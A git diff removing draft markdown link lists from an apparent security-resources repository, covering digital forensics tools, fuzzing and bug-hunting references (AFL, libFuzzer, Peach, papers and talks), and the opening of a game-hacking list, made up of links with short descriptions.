-	* The largest organizations in the world rely on SAP platforms to run their critical processes and keep their business crown jewels: financial information, customer data, intellectual property, credit cards, human resources salaries, sensitive materials, suppliers and more. Everything is there and attackers know it. For several years at Onapsis we have been researching on how cyber-criminals might be able to break into ERP systems in order to help organizations better protect themselves. This has enabled us to gain a unique expertise on which are the most critical attack vectors and what kind of traces they leave (and don’t) over the victim’s SAP platforms. SAP systems need to be ready for Forensic Analysis, so the big question is: Are your systems prepared to retain the attackers breadcrumbs in the event of an attack? Join us and learn how to do a forensic analysis of an SAP system, looking for traces of a security breach We will also show novel techniques being used by attackers to avoid being detected during post attack forensic investigations. Vulnerabilities related to anti-forensic techniques will be presented together with their mitigation. **NEW** New attacks never presented before will be shown. JAVA, ABAP and BO systems will be covered.
-* [int0x80 (of Dual Core) -- Anti-Forensics for the Louise - Derbycon](https://www.youtube.com/watch?v=-HK1JHR7LIM	)
-
-
-
---------------
-### <a name="mobile">Mobile Device Forensics</a>
-
-
-
-#### <a name="android">Android Forensics</a>
-* [Android Forensics class - OpenSecurity Training](http://opensecuritytraining.info/AndroidForensics.html)
-	* This class serves as a foundation for mobile digital forensics, forensics of Android operating systems, and penetration testing of Android applications. 
-* [Androick](https://github.com/Flo354/Androick)
-	* Androick is a python tool to help in forensics analysis on android. Put the package name, some options and the program will download automatically apk, datas, files permissions, manifest, databases and logs. It is easy to use and avoid all repetitive tasks!
-
---------------
-####<a name="ios">iOS Forensics</a>
-
-http://www.forensicswiki.org/wiki/Apple_iPhone
-
-http://www.iosresearch.org/
-* [iOSForensic](https://github.com/Flo354/iOSForensic)
-	* iosForensic is a python tool to help in forensics analysis on iOS. It get files, logs, extract sqlite3 databases and uncompress .plist files in xml.
-* [iOS Forensics Analyis(2012) SANS Whitepaper](https://www.sans.org/reading-room/whitepapers/forensics/forensic-analysis-ios-devices-34092)
-* [iOS Forensic Investigative Methods Guide](http://www.zdziarski.com/blog/wp-content/uploads/2013/05/iOS-Forensic-Investigative-Methods.pdf)
-* [The art of iOS and iCloud forensics](https://blog.elcomsoft.com/2017/11/the-art-of-ios-and-icloud-forensics/)
-
-
---------------
-### <a name="pdf">PDF Forensics</a>
-
-http://countuponsecurity.com/2014/09/22/malicious-documents-pdf-analysis-in-5-steps/
-* [Didier Stevens Blog](https://blog.didierstevens.com/)
-* [PDF Forensics](http://countuponsecurity.com/2014/09/22/malicious-documents-pdf-analysis-in-5-steps/)
-
-
---------------
-###< a name="photo">Photo Forensics</a>
-* [jhead](http://www.sentex.net/~mwandel/jhead/)
-	* Exif Jpeg header manipulation tool
-
---------------
-### <a name="tools">Tools:</a>
-
-Ghiro 
-* [StegExpose](https://github.com/b3dk7/StegExpose)
-	* StegExpose is a steganalysis tool specialized in detecting LSB (least significant bit) steganography in lossless images such as PNG and BMP. It has a command line interface and is designed to analyse images in bulk while providing reporting capabilities and customization which is comprehensible for non forensic experts. StegExpose rating algorithm is derived from an intelligent and thoroughly tested combination of pre-existing pixel based staganalysis methods including Sample Pairs by Dumitrescu (2003), RS Analysis by Fridrich (2001), Chi Square Attack by Westfeld (2000) and Primary Sets by Dumitrescu (2002). In addition to detecting the presence of steganography, StegExpose also features the quantitative steganalysis (determining the length of the hidden message). StegExpose is part of my MSc of a project at the School of Computing of the University of Kent, in Canterbury, UK.
-
-
-
-
-
-
-
---------------
-### <a name="linux">Linux Forensics</a>
-* [Santoku Linux How-Tos'](https://santoku-linux.com/howtos)
-
-
-### <a name="windows">Windows Forensics</a>
-* [SANS CHEAT SHEET- Windows Artifact Analysis](https://uk.sans.org/posters/windows_artifact_analysis.pdf)
-* [How to parse Windows Eventlog](http://dfir-blog.com/2016/03/13/how-to-parse-windows-eventlog/)
-* [Know your Windows' Processes](https://sysforensics.org/2014/01/know-your-windows-processes.html)
-
-
-
-
-
-#### Windows Forensics Tools
-* [NTDSXtract - Active Directory Forensics Framework](http://www.ntdsxtract.com/)
-	* Description from the page: This framework was developed by the author in order to provide the community
-with a solution to extract forensically important information from the main
-database of Microsoft Active Directory (NTDS.DIT).
-* [Did it Execute? - Mandiant](https://www.mandiant.com/blog/execute/)
-	* You found a malicious executable! Now you’ve got a crucial question to answer: did the file execute? We’ll discuss a few sources of evidence you can use to answer this question. In this post, we will focus on static or “dead drive” forensics on Windows systems. We will cover four main sources of evidence: Windows Prefetch, Registry, Log Files, and File Information.
-* [Get-InjectedThread.ps1](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
-	* Code from "Taking Hunting to the Next Level: Hunting in Memory" presentation at SANS Threat Hunting Summit 2017 by Jared Atkinson and Joe Desimone
-* [HowTo: Determine Program Execution](http://windowsir.blogspot.com/2013/07/howto-determine-program-execution.html)
-* [Kansa -A Powershell incident response framework ](https://github.com/davehull/Kansa)
-	* A modular incident response framework in Powershell. Note there's a bug that's currently cropping up in PowerShell version 2 systems, but version 3 and later should be fine
-* [License to Kill: Malware Hunting with the Sysinternals Tools](http://channel9.msdn.com/Events/TechEd/NorthAmerica/2013/ATC-B308)
-* [Windows Program Automatic Startup Locations](http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/)
-* [Collection of Windows Autostart locations](http://gladiator-antivirus.com/forum/index.php?showtopic=24610)
-* [Spotting the Adversary with Windows Event Log Monitoring - NSA](http://cryptome.org/2014/01/nsa-windows-event.pdf)
-	* NSA 70-page writeup on windows event log monitoring
-* [DPAPIck](http://dpapick.com/)
-	* This is a forensic tool to deal, in an offline way, with Microsoft Windows® protected data, using the DPAPI (Data Protection API
-* [Techniques for fast windows forensics investigations](https://www.youtube.com/watch?v=eI4ceLgO_CE)
-	* Look at sniper forensics, skip around, 18min has resources you want to grab for snapshots
-* [Know your Windows Processes or Die Trying](https://sysforensics.org/2014/01/know-your-windows-processes.html)
-	* Excellent quick reference on Windows proccesses with a focus on Win7. Good resource.
-* [WinPrefetchView v1.25](http://www.nirsoft.net/utils/win_prefetch_view.html)
-	* Each time that you run an application in your system, a Prefetch file which contains information about the files loaded by the application is created by Windows operating system. The information in the Prefetch file is used for optimizing the loading time of the application in the next time that you run it. WinPrefetchView is a small utility that reads the Prefetch files stored in your system and display the information stored in them. By looking in these files, you can learn which files every application is using, and which files are loaded on Windows boot. 
-* [BTA - AD Security Audit Framework](https://bitbucket.org/iwseclabs/bta)
-	* BTA is an open-source Active Directory security audit framework. Its goal is to help auditors harvest the information they need to answer such questions as:
-		* Who has rights over a given object (computer, user account, etc.) ?
-		* Who can read a given mailbox ?
-		* Which are the accounts with domain admin rights ?
-		* Who has extended rights (userForceChangePassword, SendAs, etc.) ?
-		* What are the changes done on an AD between two points in time ?
-* [Claimsman]()
-	* Claimsman logs all file handle creation on Windows systems, and logs to both a local file and centralized log management system.
-* [FastIR Collector](https://github.com/SekoiaLab/Fastir_Collector)
-	* This tool collects different artefacts on live Windows and records the results in csv or json files. With the analyses of these artefacts, an early compromission can be detected.
-* [FastIR Collector on advanced threats](http://www.sekoia.fr/blog/wp-content/uploads/2015/10/FastIR-Collector-on-advanced-threats_v1.4.pdf)
-* [Windows Attribute changer](http://www.petges.lu/home/)
-* [Event Tracing for Windows and Network Monitor](http://blogs.technet.com/b/netmon/archive/2009/05/13/event-tracing-for-windows-and-network-monitor.aspx)
-	* "Event Tracing for Windows, (ETW), has been around for quite a while now as it was introduced in Windows 2000. It's basically instrumented logging that describes what a component is doing. Conceptually, it’s something like the proverbial printf("here1") concept used by programmers, but it is present in retail builds. When you enable logging in a component the result is an ETL (Event Trace Log) file. What’s new is that that Network Monitor can read any ETL file. And with the supplied parsers many network oriented ETW providers can be decoded."
-* [PowerForensics - PowerShell Digital Forensics](https://github.com/Invoke-IR/PowerForensics)
-	* The purpose of PowerForensics is to provide an all inclusive framework for hard drive forensic analysis. PowerForensics currently supports NTFS and FAT file systems, and work has begun on Extended File System and HFS+ support.
-
---------------
-### <a name="osx">OS X Forensics Tools</a>
-* [OS X Audiotr](https://github.com/jipegit/OSXAuditor)
-	* OS X Auditor is a free Mac OS X computer forensics tool.
-* [OS X Forensics Generals](https://davidkoepi.wordpress.com/category/os-x-forensics-10-8/)
-* [OSX Lion User Interface Preservation Analysis](https://digital-forensics.sans.org/blog/2011/10/03/osx-lion-user-interface-preservation-analysis#)
-
-
-
---------------
-#### Bootkit Disk Forensics
-* [Part 1](http://www.malwaretech.com/2015/02/bootkit-disk-forensics-part-1.html)
-* [Part 2](http://www.malwaretech.com/2015/03/bootkit-disk-forensics-part-2.html)
-
-
---------------
-### Chrome Book Forensics
-* [Chromebook Forensics](http://www.dataforensics.org/google-chromebook-forensics/)
-
-
-
-
-
-
-
-
-
-
-
diff --git a/Draft/Fuzzing Bug Hunting.md b/Draft/Fuzzing Bug Hunting.md
deleted file mode 100755
index e148543..0000000
--- a/Draft/Fuzzing Bug Hunting.md	
+++ /dev/null
@@ -1,271 +0,0 @@
-## Fuzzing
-
-TOC
-
-* [General](#general)
-* [Videos/Presentations](#videos)
-* [Techniques](#tech)
-* [Write-ups](#writeup)
-* [Training](#training)
-* [Tools](#tools)
-* [Papers](#papers)
-* [Presentations](#presen)
-* [Books](#books)
-* [Miscellaneous](#misc)
-
-
-
-
-
-#### sort
-* [Introduction to USB and Fuzzing DEFCON23 Matt DuHarte](https://www.youtube.com/watch?v=KWOTXypBt4E)
-
-https://raw.githubusercontent.com/secfigo/Awesome-Fuzzing/master/README.md
-
-#### end sort
-##### To Do
-* Add Descriptions/generals to types of fuzzing
-
-
-------------
-### <a name="general"></a>General
-* [Symbolic execution timeline](https://github.com/enzet/symbolic-execution)
-	* Diagram highlights some major tools and ideas of pure symbolic execution, dynamic symbolic execution (concolic) as well as related ideas of model checking, SAT/SMT solving, black-box fuzzing, taint data tracking, and other dynamic analysis techniques.
-* [15 minute guide to fuzzing](https://www.mwrinfosecurity.com/our-thinking/15-minute-guide-to-fuzzing/)
-* [Fuzzing basics...how to break software - grid - Scott M](http://www.irongeek.com/i.php?page=videos/derbycon6/411-fuzzing-basicshow-to-break-software-grid-aka-scott-m)
-	* Ever wanted to break software? You know you want to...it's fun! In this talk, I will share some tools & techniques I've used to improve software by breaking it.
-* [Quick explanation of fuzzing and various fuzzers](http://whoisjoe.info/?p=16)
-* [Basic fuzzing framework](https://www.cert.org/vulnerability-analysis/tools/bff-download.cfm)
-* [Fuzzing 101 (Part 1)]()
-* [Fuzzing 101 (Part 2)](https://vimeo.com/5237484)
-* [Fuzzing workflows; a fuzz job from start to finish](https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/)
-* [Youtube Playlist of Fuzzing Videos](https://www.youtube.com/playlist?list=PLtPrYlwXDImiO_hzK7npBi4eKQQBgygLD)
-
-------------
-### Blogposts
-* [Fools of Golden Gate](https://blog.silentsignal.eu/2017/05/08/fools-of-golden-gate/)
-	* How major vulnerabilities/large amounts of publicly vulnerable systems can exist without public recognition for long periods of time. (i.e. CVEs(10.0) exist, but no mapping in nessus/metasploit/etc)
-
-
-
-
-
-
-
-
-
-------------
-### <a name="tech">Techniques</a>
-
-
-
-#### Taint Analysis
-* [Taint analysis and pattern matching with Pin - Jonathan Salwan](http://shell-storm.org/blog/Taint-analysis-and-pattern-matching-with-Pin/)
-
-
-#### Manual Source Code Analysis
-* [GitHub for Bug Bounty Hunters](https://gist.github.com/EdOverflow/922549f610b258f459b219a32f92d10b)
-* [Secure Code Review - OpenSecurityTraining.info](http://opensecuritytraining.info/SecureCodeReview.html)
-* [High-Level Approaches for Finding Vulnerabilities](http://jackson.thuraisamy.me/finding-vulnerabilities.html)
-
-
-
-
-
-
-------------
-### <a name="writeup">Writeups</a>
-* [From Fuzzing to 0day.](http://blog.techorganic.com/2014/05/14/from-fuzzing-to-0-day/)
-* [Faster Fuzzing with Python](https://labs.mwrinfosecurity.com/blog/2014/12/10/faster-fuzzing-with-python/)
-* [Walkthrough of setting up CERT’s FOE fuzzer and fuzzing irfanview](http://www.singlehop.com/blog/lets-fuzz-irfanview/)
-* [How to fuzz a server with American Fuzzy Lop](https://www.fastly.com/blog/how-fuzz-server-american-fuzzy-lop)
-* [Fuzzing for MS15-010](http://blog.beyondtrust.com/fuzzing-for-ms15-010)
-	* Is what it says on the tin.
-* [Advice From A Researcher: Hunting XXE For Fun and Profit](https://blog.bugcrowd.com/advice-from-a-researcher-xxe/)
-* [Running Windows 64-bit in QEMU Emulation Mode](https://www.invincealabs.com/blog/2016/07/running-windows-64bit-qemu/)
-* [There's a lot of vulnerable OS X applications out there](https://vulnsec.com/2016/osx-apps-vulnerabilities/)
-* [Binary SMS - The old backdoor to your new thing](https://www.contextis.com/resources/blog/binary-sms-old-backdoor-your-new-thing/)
-* [Hacking Virtual Appliances - DerbyconV](https://www.irongeek.com/i.php?page=videos/derbycon5/fix-me08-hacking-virtual-appliances-jeremy-brown)
-	* Virtual Appliances have become very prevalent these days as virtualization is ubiquitous and hypervisors commonplace. More and more of the major vendors are providing literally virtual clones for many of their once physical-only products. Like IoT and the CAN bus, it's early in the game and vendors are late as usual. One thing that it catching these vendors off guard is the huge additional attack surface, ripe with vulnerabilities, added in the process. Also, many vendors see software appliances as an opportunity for the customer to easily evaluate the product before buying the physical one, making these editions more accessible and debuggable by utilizing features of the platform on which it runs. During this talk, I will provide real case studies for various vulnerabilities created by mistakes that many of the major players made when shipping their appliances. You'll learn how to find these bugs yourself and how the vendors went about fixing them, if at all. By the end of this talk, you should have a firm grasp of how one goes about getting remotes on these appliances.
-* [Fuzzing for MS15-010](http://blog.beyondtrust.com/fuzzing-for-ms15-010)
-	* This past Patch Tuesday Microsoft released MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution.  This patch addressed multiple privately reported vulnerabilities in win32k.sys and one publicly disclosed vulnerability in cng.sys. This post goes through identifying the patched vulnerability.
-
-
-
-
-------------
-### <a name="papers">Papers</a>
-* [Smart COM Fuzzing - Auditing IE Sandbox Bypass in COM Objects• Xiaoning Li • Haifei Li](https://0b3dcaf9-a-62cb3a1a-s-sites.googlegroups.com/site/zerodayresearch/Smart_COM_Fuzzing_Auditing_IE_Sandbox_Bypass_in_COM_Objects_final.pdf)
-* [Applying Taint Analysis and Theorem Proving to Exploit Development - Sean Heelan - RECON2010](http://static1.squarespace.com/static/507c09ede4b0954f51d59c75/t/508eb764e4b047ba54db4999/1351530340153/applying_taint_analysis_and_theorem_proving_to_xdev.pdf)
-* [All You Ever Wanted to Know About Dynamic Taint Analysis and Forward Symbolic Execution (but might have been afraid to ask)](http://users.ece.cmu.edu/~ejschwar/papers/oakland10.pdf)
-	* Abstract —Dynamic taint analysis and forward symbolic execution are quickly becoming staple techniques in security analyses. Example applications of dynamic taint analysis and forward symbolic execution include malware analysis, input filter generation, test case generation, and vulnerability dis- covery. Despite the widespread usage of these two techniques, there has been little effort to formally define the algorithms and summarize the critical issues that arise when these techniques are used in typical security contexts. The contributions of this paper are two-fold. First, we precisely describe the algorithms for dynamic taint analysis and forward symbolic execution as extensions to the run-time se- mantics of a general language. Second, we highlight important implementation choices, common pitfalls, and considerations when using these techniques in a security context.
-* [A Critical Review of Dynamic Taint Analysis and Forward Symbolic Execution](https://asankhaya.github.io/pdf/)ACriticalReviewofDynamicTaintAnalysisandForwardSymbolicExecution.pdf)
-	* In this note , we describe a critical review of the paper titled “All you wanted to know about dynamics taint analysis and forward symbolic execution (but may have been afraid to ask)” [1] . We analyze the paper using Paul Elder critical thinking framework [2] . We sta rt with a summary of the paper and motivation behind the research work described in [1]. Then we evaluate the study with respect to the universal intellectual standards of [2]. We find that the paper provides a good survey of the existing techniques and algorithms used for security analysis. It explains them using the theoretical framework of operational runtime semantics. However in some places t he paper can do a better job in highlighting what new insights or heuristics can be gained from a runtime seman tics formulation. The paper fails to convince the reader how such an intricate understanding of operational semantics of a new generic language SimpIL helps in advancing the state of the art in dynamic taint analysis and forward symbolic execution. We also found that the Paul Elder critical thinking framework is a useful technique to reason about and analyze research papers.
-* [Effective Bug Discovery](http://uninformed.org/?v=all&a=27&t=sumry)
-	* Sophisticated methods are currently being developed and implemented for mitigating the risk of exploitable bugs. The process of researching and discovering vulnerabilities in modern code will require changes to accommodate the shift in vulnerability mitigations. Code coverage analysis implemented in conjunction with fuzz testing reveals faults within a binary file that would have otherwise remained undiscovered by either method alone. This paper suggests a research method for more effective runtime binary analysis using the aforementioned strategy. This study presents empirical evidence that despite the fact that bug detection will become increasingly difficult in the future, analysis techniques have an opportunity to evolve intelligently. 
-* [TAJ: Effective Taint Analysis of Web Applications - Java Webapps](http://manu.sridharan.net/files/pldi153-tripp.pdf)
-	* Taint analysis, a form of information-flow analysis, establishes whether values from untrusted methods and parameters may flow into security-sensitive operations. Taint analysis can detect many common vulnerabilities in Web applications, and so has attracted much attention from both the research community and industry. However, most static taint-analysis tools do not address criti- cal requirements for an industrial-strength tool. Specifically, an industrial-strength tool must scale to large industrial Web applica- tions, model essential Web-application code artifacts, and generate consumable reports for a wide range of attack vectors. We have designed and implemented a static Taint Analysis for Java (TAJ) that meets the requirements of industry-level applica- tions. TAJ can analyze applications of virtually any size, as it em- ploys a set of techniques designed to produce useful answers given limited time and space. TAJ addresses a wide variety of attack vec- tors, with techniques to handle reflective calls, flow through con- tainers, nested taint, and issues in generating useful reports. This paper provides a description of the algorithms comprising TAJ, evaluates TAJ against production-level benchmarks, and compares it with alternative solutions.
-* [Fuzzing the Phone in your Phone](https://www.blackhat.com/presentations/bh-usa-09/MILLER/BHUSA09-Miller-FuzzingPhone-PAPER.pdf)
-
-
-
-
-
-
-
-
-
-
-------------
-### <a name="videos">Talks/Videos</a>
-#### Bug Hunting
-* [Browser Bug Hunting and Mobile](http://slides.com/revskills/fzbrowsers#/)
-* [Upping Your Bug Hunting Skills Using Symbolic Virtual Machines by Anto  - x33fcon](https://www.youtube.com/watch?v=IPSZxGaLlyk)
-* [The Best of Bug Finding - Duo Tech Talk (Charlie Miller)](https://www.youtube.com/watch?v=1M1EOzulQsw)
-	* I look at how security vulnerabilities are found (or missed) and some of my favorite bugs and exploits I’ve come across in my career. 
-
-
-#### Fuzzing
-* [Implementing an USB Host Driver Fuzzer - Daniel Mende - Troopers14](https://www.youtube.com/watch?v=h777lF6xjs4)
-* [The Power Of Pair: One Template That Reveals 100+ Uaf Ie Vulnerabilities - BlackhatEU14](http://www.securitytube.net/video/12924?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SecurityTube+%28SecurityTube.Net%29)
-* [What Happens In Windows 7 Stays In Windows 7 - Marion Marschalek & Joseph Moti - Troopers14](https://www.youtube.com/watch?v=s_7Cy2w2dCw)
-	* Diffing libs in Win7 compared to Win8 to id vuln dlls.
-* [DiffRay](https://github.com/pinkflawd/DiffRay)
-	* Tool for diffing Win7 & Win8 Libraries based on textfile outputs from IDA Pro.
-* [Mining for Bugs with Graph Database Queries [31c3]](https://www.youtube.com/watch?v=291hpUE5-3g)
-* [Starting out with Joern](http://tsyrklevich.net/2015/03/28/starting-out-with-joern/)
-* [Fuzz Smarter, Not Harder (An Afl-Fuzz Primer) BSides-SF 2016](http://www.securitytube.net/video/15372)
-* [File Format Fuzzing in Android](https://deepsec.net/docs/Slides/2015/File_Format_Fuzzing_in_Android_-Alexandru_Blanda.pdf)
-* [Fuzzing Object s d’ART Digging Into the New Android L Runtime Internals](http://census-labs.com/media/Fuzzing_Objects_d_ART_hitbsecconf2015ams_WP.pdf)
-* [Browser bug hunting - Memoirs of a last man standing, Atte Kettunen](https://vimeo.com/109380793)
-* [Unusual bugs - 23C3](https://www.youtube.com/watch?v=qj79Qdmw0Pk) 
-	* In this presentation I'll present a series of unusual security bugs. Things that I've ran into at some point and went "There's gotta be some security consequence here". None of these are really a secret, and most of them are even documented somewhere. But apparently most people don't seem to know about them.  What you'll see in this presentation is a list of bugs and then some explanation of how these could be exploited somehow. Some of the things I'll be talking about are (recursive) stack overflow, NULL pointer dereferences, regular expressions and more. 
-* [ClusterFuzz](http://nullcon.net/website/archives/ppt/goa-15/analyzing-chrome-crash-reports-at-scale-by-abhishek-arya.pdf)
-* [Introduction to USB and Fuzzing DEFCON23 Matt DuHarte](https://www.youtube.com/watch?v=KWOTXypBt4E)
-* [Practical File Format Fuzzing](http://www.irongeek.com/i.php?page=videos/derbycon3/3301-practical-file-format-fuzzing-jared-allar)
-	* File format fuzzing has been very fruitful at discovering exploitable vulnerabilities. Adversaries take advantage of these vulnerabilities to conduct spear-phishing attacks. This talk will cover the basics of file format fuzzing and show you how to use CERT’s fuzzing frameworks to discovery vulnerabilities in file parsers.
-* [Improving security with Fuzzing and Sanitizers](https://media.ccc.de/v/SHA2017-148-improving_security_with_fuzzing_and_sanitizers)
-	* A bug in Gstreamer could be used to own a Linux Desktop system. TCPDump released a security update fixing 42 CVEs. We have far too many security critical bugs in the free and open source software stack. But we have powerful tools to find them - we just have to use them.
-* [Introduction to Custom Protocol Fuzzing](https://www.youtube.com/watch?v=ieatSJ7ViBw)
-* [0-day streams: pdfcrack](https://www.youtube.com/watch?v=8VLNPIIgKbQ&app=desktop)
-
-
-
-------------
-### <a name="books">Books</a>
-* [*THE* Book on fuzzing](http://fuzzing.org/)
-
-
-
-
-------------
-### <a name="training"></a>Training
-[Modern fuzzing of C/C++ Projects - Slides](https://docs.google.com/presentation/d/1pbbXRL7HaNSjyCHWgGkbpNotJuiC4O7L_PDZoGqDf5Q/edit#slide=id.p4)
-
-[libfuzzer-workshop](https://github.com/Dor1s/libfuzzer-workshop)
-* Materials of "Modern fuzzing of C/C++ Projects" workshop.
-
-
-
-
-
-
-
-------------
-### <a name="tools">Tools</a>
-
-#### Non OS Specific
-* [honggfuzz](https://github.com/google/honggfuzz)
-	* Security oriented fuzzer with powerful analysis options. Supports evolutionary, feedback-driven fuzzing based on code coverage (sw and hw) http://google.github.io/honggfuzz/
-* [Grinder - Fuzzer](https://github.com/stephenfewer/grinder)
-	* Grinder is a system to automate the fuzzing of web browsers and the management of a large number of crashes. Grinder Nodes provide an automated way to fuzz a browser, and generate useful crash information (such as call stacks with symbol information as well as logging information which can be used to generate reproducible test cases at a later stage). A Grinder Server provides a central location to collate crashes and, through a web interface, allows multiple users to login and manage all the crashes being generated by all of the Grinder Nodes.
-* [USB Fuzzing Basics: From fuzzing to bug reporting](http://blog.quarkslab.com/usb-fuzzing-basics-from-fuzzing-to-bug-reporting.html)
-* [libFuzzer]((http://llvm.org/docs/LibFuzzer.html)
-	* library for in-process evolutionary fuzzing of other libraries.
-* [crashwalk](https://github.com/bnagy/crashwalk)
-	* Bucket and triage on-disk crashes. OSX and Linux.(automated triaging of AFL-based crashes)
-* [CERT’s Failure Observation Engine (FOE)](https://www.cert.org/vulnerability-analysis/tools/foe.cfm)
-	* The CERT Failure Observation Engine (FOE) is a software testing tool that finds defects in applications that run on the Windows platform. FOE performs mutational fuzzing on software that consumes file input. (Mutational fuzzing is the act of taking well-formed input data and corrupting it in various ways looking for cases that cause crashes.) The FOE automatically collects test cases that cause software to crash in unique ways, as well as debugging information associated with the crashes. The goal of FOE is to minimize the effort required for software vendors and security researchers to efficiently discover and analyze security vulnerabilities found via fuzzing.
-* [Zulu Fuzzer](https://github.com/nccgroup/Zulu)
-	* The Zulu fuzzer
-* [Radamsa](https://code.google.com/p/ouspg/wiki/Radamsa)
-	* Radamsa is a test case generator for robustness testing, aka a fuzzer. It can be used to test how well a program can stand malformed and potentially malicious inputs. It operates based on given sample inputs and thus requires minimal effort to set up. The main selling points of radamsa are that it is easy to use, contains several old and new fuzzing algorithms, is easy to script from command line and has already been used to find a slew of bugs in programs that actually matter. 
-* [browserfuzz](https://bitbucket.org/blackaura/browserfuzz)
-	* A very simple browser fuzzer based on tornado.
-* [sandbox-attacksurface-analysis-tools](https://github.com/google/sandbox-attacksurface-analysis-tools)
-	* This is a small suite of tools to test various properties of sandboxes on Windows. Many of the checking tools take a -p flag which is used to specify the PID of a sandboxed process. The tool will impersonate the token of that process and determine what access is allowed from that location. Also it's recommended to run these tools as an administrator or local system to ensure the system can be appropriately enumerated.
-* [Kitty][https://github.com/cisco-sas/kitty]
-	* Fuzzing framework written in python(Not a fuzzer)
-* [IDA Pro](https://www.hex-rays.com/products/ida/index.shtml)
-* [binnavi](https://github.com/google/binnavi) - Binary analysis IDE, annotates control flow graphs and call graphs of disassembled code.
-* [Capstone](https://github.com/aquynh/capstone) - Capstone is a lightweight multi-platform, multi-architecture disassembly framework.
-* [KernelFuzzer](https://github.com/mwrlabs/KernelFuzzer) - Cross Platform Kernel Fuzzer Framework.
-* [honggfuzz](http://google.github.io/honggfuzz/) - A general-purpose, easy-to-use fuzzer with interesting analysis options.
-* [Hodor Fuzzer](https://github.com/nccgroup/hodor) - Yet Another general purpose fuzzer.
-* [libFuzzer](http://libfuzzer.info) - In-process, coverage-guided, evolutionary fuzzing engine for targets written in C/C++.
-* [Fuzzapi](https://github.com/lalithr95/fuzzapi) - Fuzzapi is rails application which uses API_Fuzzer and provide UI solution for gem.
-* [ansvif](https://oxagast.github.io/ansvif/) - An advanced cross platform fuzzing framework designed to find vulnerabilities in C/C++ code.
-* [Nightmare](https://github.com/joxeankoret/nightmare) - A distributed fuzzing testing suite with web administration, supports fuzzing using network protocols.
-* [rage_fuzzer](https://github.com/deanjerkovich/rage_fuzzer) - A dumb protocol-unaware packet fuzzer/replayer.
-* [libfuzzer-gv](https://github.com/guidovranken/libfuzzer-gv) - enhanced fork of libFuzzer
-* [libFuzzer-gv: new techniques for dramatically faster fuzzing](https://guidovranken.wordpress.com/2017/07/08/libfuzzer-gv-new-techniques-for-dramatically-faster-fuzzing/)
-
-
-#### Windows Specific
-* [WinAFL] (https://github.com/ivanfratric/winafl) - A fork of AFL for fuzzing Windows binaries 
-* [!exploitable Crash Analyzer](https://msecdbg.codeplex.com/)
-	* !exploitable (pronounced “bang exploitable”) is a Windows debugging extension (Windbg) that provides automated crash analysis and security risk assessment. The tool first creates hashes to determine the uniqueness of a crash and then assigns an exploitability rating to the crash: Exploitable, Probably Exploitable, Probably Not Exploitable, or Unknown. There is more detailed information about the tool in the following .pptx file or at http://www.microsoft.com/security/msec. Additonally, see the blog post at http://blogs.technet.com/srd/archive/2009/04/08/the-history-of-the-exploitable-crash-analyzer.aspx, or watch the video at http://channel9.msdn.com/posts/PDCNews/Bang-Exploitable-Security-Analyzer/.
-
-
-
-
-#### Linux Specific
-* [American Fuzzy Lop AFL](http://lcamtuf.coredump.cx/afl/)
-	* American fuzzy lop is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. This substantially improves the functional coverage for the fuzzed code. The compact synthesized corpora produced by the tool are also useful for seeding other, more labor- or resource-intensive testing regimes down the road. 
-	* It was made by lcamtuf. What more do you need?
-* [afl-dyninst ; AFL Fuzzing blackbox binaries](https://github.com/vrtadmin/moflow/tree/master/afl-dyninst)
-	* American Fuzzy Lop + Dyninst == AFL Fuzzing blackbox binaries  The tool has two parts. The instrumentation tool and the instrumentation  library. Instrumentation library has an initialization callback and basic  block callback functions which are designed to emulate what AFL is doing with afl-gcc/afl-g++/afl-as.  Instrumentation tool (afl-dyninst) instruments the supplied binary by inserting callbacks for each basic block and an initialization  callback either at _init or at specified entry point.
-* [syzkaller - linux syscall fuzzer](https://github.com/google/syzkaller)
-	* An unsupervised, coverage-guided Linux syscall fuzzer. It is meant to be used with KASAN (CONFIG_KASAN=y), KTSAN (CONFIG_KTSAN=y), or KUBSAN.
-* [Google - AddressSanitizer, ThreadSanitizer, MemorySanitizer, LeaksSanitizer](https://github.com/google/sanitizers)
-	* This project is the home for Sanitizers: AddressSanitizer, MemorySanitizer, ThreadSanitizer, LeakSanitizer. The actual code resides in the LLVM repository. Here we keep extended documentation, bugs and some helper code.
-
-
-
-
-
-
-#### Android Specific
-* [MFFA - Media Fuzzing Framework for Android](https://github.com/fuzzing/MFFA)
-
-
-
-
-
-
-#### Peach Fuzzer
-* [Peach Documentation](http://old.peachfuzzer.com/Introduction.html)
-* [Creating Custom Peach Fuzzer Publishers](http://blog.opensecurityresearch.com/2014/01/creating-custom-peach-fuzzer-publishers.html)
-* [Creating Custom Peach Fuzzer Publishers](http://blog.opensecurityresearch.com/2014/01/creating-custom-peach-fuzzer-publishers.html)
-* [Code](https://github.com/OpenSecurityResearch/CustomPeachPublisher
-
-Fuzzing with Peach tutorial
-* [Part 1](http://www.flinkd.org/2011/07/fuzzing-with-peach-part-1/)
-* [Part 2](http://www.flinkd.org/2011/11/fuzzing-with-peach-part-2-fixups-2/)
-
-* [Fuzzing Vulnserver with Peach 3](http://rockfishsec.blogspot.com/2014/01/fuzzing-vulnserver-with-peach-3.html)
-
-
-### Taint Analysis
-* [PANDA ( Platform for Architecture-Neutral Dynamic Analysis )](https://github.com/moyix/panda)
-* [QIRA (QEMU Interactive Runtime Analyser)](http://qira.me/)
-
-
-------------
-### <a name="misc">Misc</a>
-* [Good slides on fuzzing](https://courses.cs.washington.edu/courses/cse484/14au/slides/Section8.pdf)
-* [USB Fuzzing Basics from fuzzing to Bug Reporting](http://blog.quarkslab.com/usb-fuzzing-basics-from-fuzzing-to-bug-reporting.html)
-
-
-
-
diff --git a/Draft/Game Hacking.md b/Draft/Game Hacking.md
deleted file mode 100755
index 61e92ad..0000000
--- a/Draft/Game Hacking.md	
+++ /dev/null
@@ -1,133 +0,0 @@
-## Game Hacking
-
-
-### TOC
-* [General](#general)
-* [Writeups](#writeups)
-* [Console Hacking](#console)
-* [Reverse Engineering Games](#re)
-* [Talks & Presentations](#talks)
-* [Tools](#tools)
-
-
-
-
-
-
-
-
-
-
-#### Sort
-[OwnedCore](http://www.ownedcore.com/forums/)
-
-#### End Sort
-
-
-------------
